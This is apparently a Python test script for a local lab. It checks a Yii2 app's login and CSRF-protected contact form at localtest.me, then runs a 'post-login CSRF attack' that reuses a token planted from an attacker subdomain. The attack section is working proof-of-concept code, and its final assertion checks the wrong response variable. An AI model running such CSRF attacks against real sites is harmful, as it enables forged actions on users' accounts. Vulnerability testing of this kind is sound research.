import requests
from bs4 import BeautifulSoup
import random
import os


try:
    PROTOCOL = os.environ['PROTOCOL']
except:
    PROTOCOL = 'http'
TARGET = f'{PROTOCOL}://localtest.me/'
ATTACKER = f'{PROTOCOL}://attack.localtest.me/'
PRIVATE_KEY = './server/localtest.me.crt'
USER1 = 'demo'
USER2 = 'demo'
PASSWORD = "demo"

NON_LOGIN_STRING = 'Currently not logged in.'

def get_csrf_token(page):
    return BeautifulSoup(page, 'html.parser').find("input", {"name" : "_csrf"})['value']

def send_contact_yii2(csrf_token):
    return s.post(TARGET + 'index.php?r=site/contact', data = {'_csrf' : csrf_token, "ContactForm[name]" : "abcd", "ContactForm[email]" : "abcd@abcd.com", "ContactForm[subject]" : "abcd", "ContactForm[body]" : "xyzw", "contact-button" : ""})

def login_yii2(id):
    r = s.get(TARGET + 'index.php?r=site/login', verify = PRIVATE_KEY)
    assert 'Please fill out the following fields to login:' in r.text

    csrf_token = get_csrf_token(r.text)
    r = s.post(TARGET + 'index.php?r=site/login', data = {'_csrf' : csrf_token, 'LoginForm[username]' : id, 'LoginForm[password]' : PASSWORD, 'LoginForm[rememberMe]' : 0, 'login-button' : ''})

    assert f'Hello {id}!' in r.text

    return r


def logout(csrf_token):
    r = s.post(TARGET + 'index.php?r=site/logout', data = {'_csrf' : csrf_token})
    assert NON_LOGIN_STRING in r.text


with requests.Session() as s:
    print("[+] Testing login")

    ### Access main page
    r = s.get(TARGET, verify = PRIVATE_KEY)
    assert NON_LOGIN_STRING in r.text

    r = s.get(TARGET + 'index.php?r=site/login')
    ### Check csrf protected operation
    csrf_token = get_csrf_token(r.text)
    r = send_contact_yii2(csrf_token)
    assert 'Not logged in' in r.text

    ### Login (any user works. No passwd)
    r = login_yii2(USER1)

    ### Check csrf protected operation
    csrf_token = get_csrf_token(r.text)
    r = send_contact_yii2(csrf_token)
    assert f'Thank you user <b>{USER1}</b> for contacting us. We will respond to you as soon as possible.' in r.text

    ### Logout
    csrf_token = get_csrf_token(r.text)
    logout(csrf_token)

    print("  - Checks passed")


with requests.Session() as s:
    print("[+] Testing post-login CSRF attack")

    ### TARGET LOGIN
    r_target = login_yii2(USER2)

    ### ATTACKER INIT
    s.get(ATTACKER, verify = PRIVATE_KEY)
    r_attacker = s.get(ATTACKER + 'set_post_session')

    ### ATTACKER CSRF
    csrf_token_attacker = get_csrf_token(r_attacker.text)

    r_attacker = send_contact_yii2(csrf_token_attacker)
    assert f'Thank you user <b>{USER1}</b> for contacting us. We will respond to you as soon as possible.' in r.text, " NOT VULNERABLE to post-login CSRF attack"

    print("  - Vulnerable to post-login CSRF attack")

